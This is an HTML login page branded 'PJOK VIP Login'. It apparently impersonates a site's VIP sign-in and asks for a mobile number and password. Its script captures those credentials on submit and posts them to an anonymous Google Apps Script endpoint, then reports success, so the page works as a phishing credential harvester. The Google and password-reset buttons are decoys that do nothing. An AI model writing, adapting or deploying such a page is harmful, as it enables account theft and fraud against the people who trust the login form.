<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PJOK VIP Login</title>

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="container">
<div class="login-box">

<div class="logo">
    <img src="https://images.23924894.com/wsd-images-prod/pjokbdtf6/fe_setting/web_logo/wps_logo_20250620214714.png">
    <h2>VIP LOGIN</h2>
</div>

<form id="loginForm">
    <div class="input-box">
        <i class="fa-solid fa-phone"></i>
        <input type="text" name="mobile" placeholder="Mobile Number" required>
    </div>

    <div class="input-box">
        <i class="fa-solid fa-lock"></i>
        <input type="password" name="password" placeholder="Password" required>
        <span class="eye"><i class="fa-solid fa-eye"></i></span>
    </div>

    <div class="remember">
        <label><input type="checkbox"> Remember Me</label>
        <a href="#">Forgot Password?</a>
    </div>

    <button type="submit" class="login-btn">LOGIN</button>

    <div class="divider"><span>OR</span></div>

    <button type="button" class="google-btn">
        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg">
        Continue with Google
    </button>

    <p class="register">
        Don't have an account? <a href="#">Register Now</a>
    </p>
</form>

</div>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const formData = new FormData(this);
    
    fetch('https://script.google.com/macros/s/AKfycbxn0Fkb8teONKL3736xc-yjLDpZ-k6jSBXdVSUxWT2Dgv4McZ-6rU_8O49DT7APVWaZmQ/exec', {
        method: 'POST',
        body: formData
    })
    .then(() => {
        alert("✅ Submitted Successfully!");
        this.reset();
    })
    .catch(() => {
        alert("❌ Something went wrong!");
    });
});
</script>

</body>
</html>
